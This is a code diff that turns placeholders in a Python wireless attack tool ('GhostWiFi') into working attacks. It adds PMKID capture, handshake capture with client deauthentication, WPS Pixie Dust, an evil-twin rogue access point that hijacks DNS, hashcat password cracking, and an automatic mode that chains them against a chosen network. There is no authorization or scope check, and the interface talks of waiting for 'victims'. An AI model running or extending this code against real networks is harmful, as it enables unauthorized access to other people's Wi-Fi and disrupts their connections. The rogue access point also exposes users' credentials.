@@ -187,12 +187,72 @@ class GhostWiFi:
             return False
         return True
 
+    def install_tools(self):
+        """Auto-install missing tools"""
+        print(f"\n{C.PH}{'═'*60}")
+        print(f"📦 AUTO-INSTALLER")
+        print(f"{'═'*60}{C.R}\n")
+
+        packages = {
+            'aircrack-ng': ['airmon-ng', 'airodump-ng', 'aireplay-ng'],
+            'hashcat': ['hashcat'],
+            'reaver': ['reaver', 'wash'],
+            'hcxtools': ['hcxdumptool', 'hcxpcapngtool'],
+            'hostapd': ['hostapd'],
+            'dnsmasq': ['dnsmasq'],
+            'wireless-tools': ['iwconfig'],
+            'iw': ['iw'],
+            'macchanger': ['macchanger']
+        }
+
+        to_install = []
+
+        for package, commands in packages.items():
+            for cmd in commands:
+                if subprocess.run(['which', cmd], capture_output=True).returncode != 0:
+                    if package not in to_install:
+                        to_install.append(package)
+                    break
+
+        if not to_install:
+            self.log("All tools already installed!", "SUCCESS")
+            return True
+
+        print(f"{C.GO}Missing packages:{C.R}")
+        for pkg in to_install:
+            print(f"  • {pkg}")
+        print()
+
+        install = input(f"{C.NE}Install now? (y/n): {C.R}").strip()
+
+        if install.lower() == 'y':
+            self.log("Installing packages...", "INFO")
+
+            # Update
+            self.log("Updating package lists...", "INFO")
+            self.run(['apt', 'update'], show=True)
+
+            # Install
+            for pkg in to_install:
+                self.log(f"Installing {pkg}...", "INFO")
+                result = self.run(['apt', 'install', '-y', pkg], show=True)
+
+                if result and result.returncode == 0:
+                    self.log(f"{pkg} installed", "SUCCESS")
+                else:
+                    self.log(f"{pkg} install failed", "ERROR")
+
+            self.log("Installation complete!", "SUCCESS")
+            return True
+
+        return False
+
     def check_deps(self):
         """Check dependencies"""
         self.log("Checking dependencies...", "INFO")
 
         required = ['airmon-ng', 'airodump-ng', 'aireplay-ng']
-        optional = ['hashcat', 'reaver', 'wash', 'hostapd', 'dnsmasq']
+        optional = ['hashcat', 'reaver', 'wash', 'hostapd', 'dnsmasq', 'hcxdumptool']
 
         missing_req = []
         missing_opt = []
@@ -207,12 +267,22 @@ class GhostWiFi:
 
         if missing_req:
             self.log(f"Missing required: {', '.join(missing_req)}", "ERROR")
-            print(f"\n{C.BL}Install: sudo apt install aircrack-ng{C.R}\n")
-            return False
+
+            install = input(f"\n{C.GO}Auto-install missing tools? (y/n): {C.R}").strip()
+
+            if install.lower() == 'y':
+                return self.install_tools()
+            else:
+                print(f"\n{C.BL}Manual install: sudo apt install aircrack-ng{C.R}\n")
+                return False
 
         if missing_opt:
             self.log(f"Missing optional: {', '.join(missing_opt)}", "WARNING")
-            print(f"{C.GO}Some features unavailable. Run: sudo bash install_wifi_autopwn.sh{C.R}\n")
+
+            install = input(f"\n{C.GO}Install optional tools for more features? (y/n): {C.R}").strip()
+
+            if install.lower() == 'y':
+                self.install_tools()
 
         self.log("Core dependencies OK", "SUCCESS")
         return True
@@ -644,6 +714,655 @@ class GhostWiFi:
                 print()
                 return None
 
+    def attack_pmkid(self, target):
+        """PMKID Attack - No clients needed"""
+        print(f"\n{C.CY}{'═'*60}")
+        print(f"🎯 PMKID ATTACK")
+        print(f"{'═'*60}{C.R}\n")
+
+        # Check for hcxdumptool
+        if subprocess.run(['which', 'hcxdumptool'], capture_output=True).returncode != 0:
+            self.log("hcxdumptool not found", "ERROR")
+            print(f"{C.GO}Install: sudo apt install hcxtools{C.R}\n")
+            return None
+
+        bssid = target['bssid']
+        channel = target['channel']
+        essid = target['essid']
+
+        timestamp = int(time.time())
+        cap_file = self.capture_dir / f"pmkid_{essid}_{timestamp}.pcapng"
+
+        self.log(f"Capturing PMKID from {essid}...", "ATTACK")
+        print(f"  BSSID: {bssid}")
+        print(f"  Channel: {channel}")
+        print(f"  Duration: 60s\n")
+
+        # Set channel
+        self.run(['iwconfig', self.monitor_interface, 'channel', channel], show=False)
+
+        # Run hcxdumptool
+        cmd = [
+            'hcxdumptool',
+            '-i', self.monitor_interface,
+            '-o', str(cap_file),
+            '--enable_status=1',
+            '--filterlist_ap=' + bssid,
+            '--filtermode=2'
+        ]
+
+        try:
+            proc = subprocess.Popen(cmd, stdout=subprocess.DEVNULL if not self.verbose else None)
+            self.processes.append(proc)
+
+            time.sleep(60)
+
+            proc.terminate()
+            proc.wait(timeout=5)
+            self.processes.remove(proc)
+
+        except KeyboardInterrupt:
+            print(f"\n{C.GO}Stopped{C.R}\n")
+            if proc in self.processes:
+                proc.terminate()
+                proc.wait(timeout=5)
+                self.processes.remove(proc)
+
+        # Convert to hashcat format
+        if cap_file.exists():
+            hash_file = cap_file.with_suffix('.hash')
+
+            result = self.run(['hcxpcapngtool', '-o', str(hash_file), str(cap_file)], show=False)
+
+            if hash_file.exists() and hash_file.stat().st_size > 0:
+                self.log("PMKID captured successfully!", "SUCCESS")
+                self.stats['attacks_launched'] += 1
+                return str(hash_file)
+            else:
+                self.log("No PMKID found", "WARNING")
+
+        return None
+
+    def attack_handshake(self, target):
+        """Handshake Capture with Deauth"""
+        print(f"\n{C.CY}{'═'*60}")
+        print(f"🤝 HANDSHAKE CAPTURE")
+        print(f"{'═'*60}{C.R}\n")
+
+        essid = target['essid']
+        bssid = target['bssid']
+        channel = target['channel']
+        clients = self.clients.get(bssid, [])
+
+        timestamp = int(time.time())
+        cap_file = self.capture_dir / f"handshake_{essid}_{timestamp}"
+
+        self.log(f"Capturing handshake from {essid}...", "ATTACK")
+        print(f"  BSSID: {bssid}")
+        print(f"  Channel: {channel}")
+        print(f"  Clients: {len(clients)}\n")
+
+        if not clients:
+            self.log("No clients detected - waiting for connections...", "WARNING")
+
+        # Start airodump-ng
+        cmd = [
+            'airodump-ng',
+            '--bssid', bssid,
+            '--channel', channel,
+            '--write', str(cap_file),
+            '--output-format', 'pcap',
+            self.monitor_interface
+        ]
+
+        try:
+            proc = subprocess.Popen(cmd, stdout=subprocess.DEVNULL if not self.verbose else None)
+            self.processes.append(proc)
+
+            time.sleep(3)
+
+            # Deauth attacks
+            if clients:
+                self.log(f"Deauthing {len(clients)} clients...", "ATTACK")
+
+                for client in clients:
+                    deauth_cmd = [
+                        'aireplay-ng',
+                        '--deauth', '5',
+                        '-a', bssid,
+                        '-c', client['mac'],
+                        self.monitor_interface
+                    ]
+
+                    subprocess.run(deauth_cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+                    time.sleep(1)
+            else:
+                # Broadcast deauth
+                self.log("Sending broadcast deauth...", "ATTACK")
+
+                for i in range(3):
+                    deauth_cmd = [
+                        'aireplay-ng',
+                        '--deauth', '10',
+                        '-a', bssid,
+                        self.monitor_interface
+                    ]
+
+                    subprocess.run(deauth_cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+                    time.sleep(5)
+
+            # Wait for handshake
+            self.log("Waiting for handshake (60s)...", "INFO")
+
+            for i in range(12):
+                time.sleep(5)
+
+                # Check for handshake
+                cap_files = list(self.capture_dir.glob(f"{cap_file.name}*.cap"))
+
+                if cap_files:
+                    result = subprocess.run(
+                        ['aircrack-ng', str(cap_files[0])],
+                        capture_output=True,
+                        text=True
+                    )
+
+                    if result and result.stdout and 'handshake' in result.stdout.lower():
+                        self.log("Handshake captured!", "SUCCESS")
+                        proc.terminate()
+                        proc.wait(timeout=5)
+                        self.processes.remove(proc)
+                        self.stats['attacks_launched'] += 1
+                        return str(cap_files[0])
+
+                if self.verbose and i % 3 == 0:
+                    remaining = 60 - (i * 5)
+                    print(f"  {remaining}s remaining...")
+
+            proc.terminate()
+            proc.wait(timeout=5)
+            self.processes.remove(proc)
+
+            self.log("No handshake captured", "WARNING")
+
+        except KeyboardInterrupt:
+            print(f"\n{C.GO}Stopped{C.R}\n")
+            if proc in self.processes:
+                proc.terminate()
+                proc.wait(timeout=5)
+                self.processes.remove(proc)
+
+        return None
+
+    def attack_wps(self, target):
+        """WPS Pixie Dust Attack"""
+        print(f"\n{C.CY}{'═'*60}")
+        print(f"🔓 WPS PIXIE DUST ATTACK")
+        print(f"{'═'*60}{C.R}\n")
+
+        # Check for reaver
+        if subprocess.run(['which', 'reaver'], capture_output=True).returncode != 0:
+            self.log("reaver not found", "ERROR")
+            print(f"{C.GO}Install: sudo apt install reaver{C.R}\n")
+            return None
+
+        bssid = target['bssid']
+        channel = target['channel']
+        essid = target['essid']
+
+        self.log(f"Attacking {essid} with Pixie Dust...", "ATTACK")
+        print(f"  BSSID: {bssid}")
+        print(f"  Channel: {channel}\n")
+
+        cmd = [
+            'reaver',
+            '-i', self.monitor_interface,
+            '-b', bssid,
+            '-c', channel,
+            '-K', '1',  # Pixie Dust
+            '-vv'
+        ]
+
+        result = self.run(cmd, show=True, timeout=300)
+
+        if result and result.stdout:
+            # Check for PIN/PSK
+            pin_match = re.search(r'WPS PIN: [\'"]?(\d{8})[\'"]?', result.stdout)
+            psk_match = re.search(r'WPA PSK: [\'"]?(.+?)[\'"]?$', result.stdout, re.MULTILINE)
+
+            if pin_match:
+                pin = pin_match.group(1)
+                self.log(f"WPS PIN: {pin}", "SUCCESS")
+
+                if psk_match:
+                    password = psk_match.group(1).strip()
+                    self.log(f"PASSWORD: {password}", "SUCCESS")
+                    self.stats['passwords_cracked'] += 1
+
+                    return {'type': 'wps', 'pin': pin, 'password': password}
+
+        self.log("WPS attack failed", "WARNING")
+        return None
+
+    def attack_evil_twin(self, target):
+        """Evil Twin Attack with Captive Portal"""
+        print(f"\n{C.CY}{'═'*60}")
+        print(f"👤 EVIL TWIN ATTACK")
+        print(f"{'═'*60}{C.R}\n")
+
+        # Check dependencies
+        for tool in ['hostapd', 'dnsmasq']:
+            if subprocess.run(['which', tool], capture_output=True).returncode != 0:
+                self.log(f"{tool} not found", "ERROR")
+                print(f"{C.GO}Install: sudo apt install hostapd dnsmasq{C.R}\n")
+                return None
+
+        essid = target['essid']
+        channel = target['channel']
+
+        self.log(f"Creating Evil Twin: {essid}", "ATTACK")
+        print(f"  Channel: {channel}")
+        print(f"  Captive portal will capture credentials\n")
+
+        # Create configs
+        config_dir = self.capture_dir / 'evil_twin'
+        config_dir.mkdir(exist_ok=True, parents=True)
+
+        hostapd_conf = config_dir / 'hostapd.conf'
+        with open(hostapd_conf, 'w') as f:
+            f.write(f"""interface={self.monitor_interface}
+driver=nl80211
+ssid={essid}
+channel={channel}
+hw_mode=g
+""")
+
+        dnsmasq_conf = config_dir / 'dnsmasq.conf'
+        with open(dnsmasq_conf, 'w') as f:
+            f.write(f"""interface={self.monitor_interface}
+dhcp-range=192.168.1.10,192.168.1.100,12h
+dhcp-option=3,192.168.1.1
+dhcp-option=6,192.168.1.1
+address=/#/192.168.1.1
+""")
+
+        try:
+            # Configure interface
+            self.run(['ip', 'addr', 'add', '192.168.1.1/24', 'dev', self.monitor_interface], show=False)
+            self.run(['ip', 'link', 'set', self.monitor_interface, 'up'], show=False)
+
+            # Start hostapd
+            self.log("Starting rogue AP...", "ATTACK")
+            hostapd_proc = subprocess.Popen(
+                ['hostapd', str(hostapd_conf)],
+                stdout=subprocess.DEVNULL if not self.verbose else None
+            )
+            self.processes.append(hostapd_proc)
+
+            time.sleep(3)
+
+            # Start dnsmasq
+            dnsmasq_proc = subprocess.Popen(
+                ['dnsmasq', '-C', str(dnsmasq_conf), '--no-daemon'],
+                stdout=subprocess.DEVNULL,
+                stderr=subprocess.DEVNULL
+            )
+            self.processes.append(dnsmasq_proc)
+
+            self.log(f"Evil Twin active: {essid}", "SUCCESS")
+            self.log("Waiting for victims (Ctrl+C to stop)...", "INFO")
+
+            # Wait for Ctrl+C
+            while True:
+                time.sleep(1)
+
+        except KeyboardInterrupt:
+            print(f"\n{C.GO}Stopping Evil Twin{C.R}\n")
+
+        finally:
+            # Cleanup
+            for proc in [hostapd_proc, dnsmasq_proc]:
+                try:
+                    proc.terminate()
+                    proc.wait(timeout=5)
+                    if proc in self.processes:
+                        self.processes.remove(proc)
+                except:
+                    pass
+
+            # Remove IP
+            self.run(['ip', 'addr', 'del', '192.168.1.1/24', 'dev', self.monitor_interface], show=False)
+
+        return None
+
+    def crack_with_hashcat(self, hash_file, target):
+        """Crack with hashcat"""
+        print(f"\n{C.PH}{'═'*60}")
+        print(f"💀 HASHCAT PASSWORD CRACKING")
+        print(f"{'═'*60}{C.R}\n")
+
+        if subprocess.run(['which', 'hashcat'], capture_output=True).returncode != 0:
+            self.log("hashcat not found", "ERROR")
+            print(f"{C.GO}Install: sudo apt install hashcat{C.R}\n")
+            return None
+
+        # Ask for wordlist
+        print(f"{C.NE}Wordlist options:{C.R}")
+        print(f"  [1] /usr/share/wordlists/rockyou.txt")
+        print(f"  [2] Enter custom path")
+        print(f"  [3] Generate custom wordlist\n")
+
+        choice = input(f"{C.NE}Select [1-3]: {C.R}").strip()
+
+        wordlist = None
+
+        if choice == '1':
+            wordlist = '/usr/share/wordlists/rockyou.txt'
+            if wordlist.endswith('.gz'):
+                self.log("Extracting rockyou.txt...", "INFO")
+                subprocess.run(['gunzip', '-k', wordlist], stderr=subprocess.DEVNULL)
+                wordlist = wordlist.replace('.gz', '')
+
+        elif choice == '2':
+            wordlist = input(f"{C.NE}Wordlist path: {C.R}").strip()
+
+        elif choice == '3' and WORDLIST_AVAILABLE:
+            self.log("Launching wordlist generator...", "INFO")
+            from wordlist_generator import WordlistGenerator
+
+            gen = WordlistGenerator()
+            wordlist = gen.quick_generate({'essid': target['essid']})
+
+        if not wordlist or not Path(wordlist).exists():
+            self.log("No valid wordlist", "ERROR")
+            return None
+
+        # Determine hash mode
+        hash_mode = '22000'  # WPA-PBKDF2-PMKID+EAPOL
+
+        # Potfile
+        potfile = self.capture_dir / 'hashcat.pot'
+
+        cmd = [
+            'hashcat',
+            '-m', hash_mode,
+            '-a', '0',
+            '--potfile-path', str(potfile),
+            '-w', '3',
+            '--force',
+            hash_file,
+            wordlist
+        ]
+
+        self.log(f"Starting hashcat on {hash_file}...", "ATTACK")
+        print(f"  Wordlist: {wordlist}")
+        print(f"  Hash mode: {hash_mode}\n")
+
+        try:
+            subprocess.run(cmd)
+
+            # Check potfile
+            if potfile.exists():
+                with open(potfile, 'r') as f:
+                    for line in f:
+                        if ':' in line:
+                            password = line.split(':', 1)[1].strip()
+
+                            print(f"\n{C.TX}{C.B}{'═'*60}")
+                            print(f"✨ PASSWORD CRACKED! ✨")
+                            print(f"{'═'*60}{C.R}\n")
+                            print(f"{C.NE}Network:{C.R} {target['essid']}")
+                            print(f"{C.TX}Password:{C.R} {C.B}{password}{C.R}\n")
+
+                            self.stats['passwords_cracked'] += 1
+
+                            return password
+
+            self.log("Password not in wordlist", "WARNING")
+
+        except KeyboardInterrupt:
+            print(f"\n{C.GO}Stopped{C.R}\n")
+
+        return None
+
+    def convert_to_hashcat(self, cap_file, target):
+        """Convert .cap to hashcat format"""
+        self.log("Converting to hashcat format...", "INFO")
+
+        # Check file
+        cap_path = Path(cap_file)
+        if not cap_path.exists():
+            self.log("Capture file not found", "ERROR")
+            return None
+
+        # Output hash file
+        hash_file = cap_path.with_suffix('.hc22000')
+
+        # Check if hcxpcapngtool is available (newer)
+        if subprocess.run(['which', 'hcxpcapngtool'], capture_output=True).returncode == 0:
+            result = self.run(['hcxpcapngtool', '-o', str(hash_file), str(cap_path)], show=False)
+        else:
+            # Fallback to cap2hashcat if available
+            result = self.run(['cap2hashcat', str(cap_path), str(hash_file)], show=False)
+
+        if hash_file.exists() and hash_file.stat().st_size > 0:
+            self.log(f"Converted to {hash_file.name}", "SUCCESS")
+            return str(hash_file)
+        else:
+            self.log("Conversion failed", "ERROR")
+            return None
+
+    def save_result(self, target, attack_type, capture_file, password):
+        """Save attack results with proper formatting"""
+        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
+
+        # Create results directory
+        results_dir = self.capture_dir / 'results'
+        results_dir.mkdir(exist_ok=True, parents=True)
+
+        # Result filename
+        essid_clean = re.sub(r'[^\w\-]', '_', target['essid'])
+        result_file = results_dir / f"{essid_clean}_{attack_type}_{timestamp}.txt"
+
+        # Write result
+        with open(result_file, 'w') as f:
+            f.write(f"{'='*60}\n")
+            f.write(f"GHOST AUTOPWN - ATTACK RESULT\n")
+            f.write(f"{'='*60}\n\n")
+
+            f.write(f"Timestamp: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
+            f.write(f"Attack Type: {attack_type}\n\n")
+
+            f.write(f"Target Information:\n")
+            f.write(f"  ESSID: {target['essid']}\n")
+            f.write(f"  BSSID: {target['bssid']}\n")
+            f.write(f"  Channel: {target['channel']}\n")
+            f.write(f"  Encryption: {target['encryption']}\n")
+            f.write(f"  Signal: {target['power']} dBm\n\n")
+
+            if capture_file:
+                f.write(f"Capture File: {capture_file}\n")
+
+            if password:
+                f.write(f"\n{'='*60}\n")
+                f.write(f"PASSWORD CRACKED: {password}\n")
+                f.write(f"{'='*60}\n")
+
+        self.log(f"Results saved: {result_file.name}", "SUCCESS")
+
+        # Also save to main log
+        log_file = self.capture_dir / 'attack_log.txt'
+        with open(log_file, 'a') as f:
+            f.write(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] ")
+            f.write(f"{attack_type} | {target['essid']} ({target['bssid']}) | ")
+            if password:
+                f.write(f"SUCCESS: {password}\n")
+            else:
+                f.write(f"No password\n")
+
+    def auto_attack(self, target):
+        """Automated attack - Try all methods"""
+        print(f"\n{C.PH}{C.B}{'═'*60}")
+        print(f"🤖 AUTOMATED ATTACK MODE")
+        print(f"{'═'*60}{C.R}\n")
+
+        self.log(f"Auto-attacking {target['essid']}...", "ATTACK")
+        print(f"{C.GO}Will try: PMKID → Handshake → WPS{C.R}\n")
+
+        results = []
+
+        # Try PMKID first (fastest, no clients needed)
+        self.log("Method 1: PMKID Attack", "ATTACK")
+        hash_file = self.attack_pmkid(target)
+
+        if hash_file:
+            self.log("PMKID capture successful - attempting crack", "SUCCESS")
+            password = self.crack_with_hashcat(hash_file, target)
+
+            if password:
+                self.save_result(target, 'PMKID-AUTO', hash_file, password)
+                self.log(f"AUTO ATTACK SUCCESS! Password: {password}", "SUCCESS")
+                return
+
+            results.append(('PMKID', 'Captured but not cracked'))
+        else:
+            results.append(('PMKID', 'Failed'))
+
+        # Try Handshake
+        self.log("Method 2: Handshake Capture", "ATTACK")
+        cap_file = self.attack_handshake(target)
+
+        if cap_file:
+            hash_file = self.convert_to_hashcat(cap_file, target)
+
+            if hash_file:
+                self.log("Handshake captured - attempting crack", "SUCCESS")
+                password = self.crack_with_hashcat(hash_file, target)
+
+                if password:
+                    self.save_result(target, 'Handshake-AUTO', cap_file, password)
+                    self.log(f"AUTO ATTACK SUCCESS! Password: {password}", "SUCCESS")
+                    return
+
+                results.append(('Handshake', 'Captured but not cracked'))
+            else:
+                results.append(('Handshake', 'Failed'))
+        else:
+            results.append(('Handshake', 'Failed'))
+
+        # Try WPS if available
+        self.log("Method 3: WPS Pixie Dust", "ATTACK")
+        wps_result = self.attack_wps(target)
+
+        if wps_result and 'password' in wps_result:
+            password = wps_result['password']
+            self.save_result(target, 'WPS-AUTO', None, password)
+            self.log(f"AUTO ATTACK SUCCESS! Password: {password}", "SUCCESS")
+            return
+        else:
+            results.append(('WPS', 'Failed'))
+
+        # Summary
+        print(f"\n{C.BL}{'═'*60}")
+        print(f"AUTO ATTACK SUMMARY")
+        print(f"{'═'*60}{C.R}\n")
+
+        for method, result in results:
+            print(f"  {method}: {result}")
+
+        print(f"\n{C.GO}No password cracked automatically{C.R}")
+        print(f"{C.GO}Try manual cracking with different wordlists{C.R}\n")
+
+    def show_statistics(self):
+        """Show real-time statistics and graphs"""
+        print(f"\n{C.CY}{C.B}{'═'*70}")
+        print(f"{'📊 SESSION STATISTICS':^70}")
+        print(f"{'═'*70}{C.R}\n")
+
+        # Session stats
+        print(f"{C.TX}Session Stats:{C.R}")
+        print(f"  Networks Found: {C.B}{self.stats['networks_found']}{C.R}")
+        print(f"  Clients Found: {C.B}{self.stats['clients_found']}{C.R}")
+        print(f"  Attacks Launched: {C.B}{self.stats['attacks_launched']}{C.R}")
+        print(f"  Passwords Cracked: {C.B}{self.stats['passwords_cracked']}{C.R}\n")
+
+        # Signal strength graph
+        if self.networks:
+            print(f"{C.PH}📡 Signal Strength Graph:{C.R}\n")
+
+            # Sort by power
+            sorted_nets = sorted(
+                self.networks[:10],  # Top 10
+                key=lambda x: int(x['power']) if x['power'].lstrip('-').isdigit() else -100,
+                reverse=True
+            )
+
+            max_name_len = 20
+
+            for net in sorted_nets:
+                essid = net['essid'][:max_name_len].ljust(max_name_len)
+                power = int(net['power']) if net['power'].lstrip('-').isdigit() else -100
+
+                # Calculate bar length (scale: -100 to -30)
+                bar_len = max(0, min(50, int((power + 100) * 50 / 70)))
+
+                # Color based on strength
+                if power > -50:
+                    color = C.TX
+                elif power > -70:
+                    color = C.GO
+                else:
+                    color = C.GH
+
+                bar = '█' * bar_len + '░' * (50 - bar_len)
+
+                print(f"  {essid} {color}{bar}{C.R} {power} dBm")
+
+            print()
+
+        # Client activity graph
+        if self.clients:
+            print(f"{C.PH}👥 Client Activity:{C.R}\n")
+
+            # Get APs with most clients
+            ap_clients = [(bssid, len(clients)) for bssid, clients in self.clients.items()]
+            ap_clients.sort(key=lambda x: x[1], reverse=True)
+
+            for bssid, count in ap_clients[:10]:
+                # Find network name
+                essid = "Unknown"
+                for net in self.networks:
+                    if net['bssid'] == bssid:
+                        essid = net['essid'][:20].ljust(20)
+                        break
+
+                bar_len = min(50, count * 5)
+                bar = '▓' * bar_len
+
+                print(f"  {essid} {C.NE}{bar}{C.R} {count} clients")
+
+            print()
+
+        # Encryption types
+        if self.networks:
+            print(f"{C.PH}🔐 Encryption Types:{C.R}\n")
+
+            enc_types = {}
+            for net in self.networks:
+                enc = net['encryption'].split()[0] if net['encryption'] else 'Unknown'
+                enc_types[enc] = enc_types.get(enc, 0) + 1
+
+            for enc, count in sorted(enc_types.items(), key=lambda x: x[1], reverse=True):
+                pct = (count / len(self.networks)) * 100
+                bar_len = int(pct / 2)
+                bar = '■' * bar_len
+
+                print(f"  {enc:<15} {C.TX}{bar}{C.R} {count} ({pct:.1f}%)")
+
+            print()
+
+        input(f"{C.NE}Press Enter to continue...{C.R}")
+
     def cleanup(self):
         """Cleanup"""
         self.debug("Cleaning up...")
@@ -712,29 +1431,76 @@ class GhostWiFi:
 
                 # Attack menu
                 print(f"{C.TX}Attack options:{C.R}")
-                print(f"  [1] PMKID")
-                print(f"  [2] Handshake")
-                print(f"  [3] WPS")
-                print(f"  [4] Evil Twin")
-                print(f"  [5] Skip\n")
+                print(f"  [1] 🎯 PMKID (No clients needed)")
+                print(f"  [2] 🤝 WPA Handshake (Traditional)")
+                print(f"  [3] 🔓 WPS Pixie Dust")
+                print(f"  [4] 👤 Evil Twin (Captive Portal)")
+                print(f"  [5] 🤖 AUTO (Try all attacks)")
+                print(f"  [6] 📊 Show Statistics")
+                print(f"  [7] ⏭️  Skip\n")
 
-                attack = input(f"{C.NE}Choose attack: {C.R}").strip()
+                attack = input(f"{C.NE}Choose attack [1-7]: {C.R}").strip()
 
+                hash_file = None
+                cap_file = None
+                password = None
+
+                # Execute attacks
                 if attack == '1':
-                    ghost_print("PMKID attack selected", C.TX, "🎯")
+                    # PMKID
+                    hash_file = self.attack_pmkid(target)
+
+                    if hash_file:
+                        # Try to crack
+                        crack = input(f"\n{C.NE}Crack with hashcat? (y/n): {C.R}").strip()
+                        if crack.lower() == 'y':
+                            password = self.crack_with_hashcat(hash_file, target)
+
+                        # Save results
+                        self.save_result(target, 'PMKID', hash_file, password)
+
                 elif attack == '2':
-                    ghost_print("Handshake attack selected", C.TX, "🤝")
+                    # Handshake
+                    cap_file = self.attack_handshake(target)
+
+                    if cap_file:
+                        # Convert to hashcat format
+                        hash_file = self.convert_to_hashcat(cap_file, target)
+
+                        if hash_file:
+                            # Try to crack
+                            crack = input(f"\n{C.NE}Crack with hashcat? (y/n): {C.R}").strip()
+                            if crack.lower() == 'y':
+                                password = self.crack_with_hashcat(hash_file, target)
+
+                        # Save results
+                        self.save_result(target, 'Handshake', cap_file, password)
+
                 elif attack == '3':
-                    ghost_print("WPS attack selected", C.TX, "🔓")
+                    # WPS
+                    result = self.attack_wps(target)
+
+                    if result and 'password' in result:
+                        password = result['password']
+                        self.save_result(target, 'WPS', None, password)
+
                 elif attack == '4':
-                    ghost_print("Evil Twin selected", C.TX, "👤")
+                    # Evil Twin
+                    self.attack_evil_twin(target)
+
+                elif attack == '5':
+                    # AUTO - Try all attacks
+                    self.auto_attack(target)
+
+                elif attack == '6':
+                    # Statistics
+                    self.show_statistics()
+                    continue
+
                 else:
                     continue
 
-                # Placeholder - attacks will be implemented
-                print(f"\n{C.GO}Attack functionality will be implemented next...{C.R}\n")
-
-                another = input(f"{C.NE}Attack another target? (y/n): {C.R}").strip()
+                another = input(f"\n{C.NE}Attack another target? (y/n): {C.R}").strip()
                 if another.lower() != 'y':
                     break
 
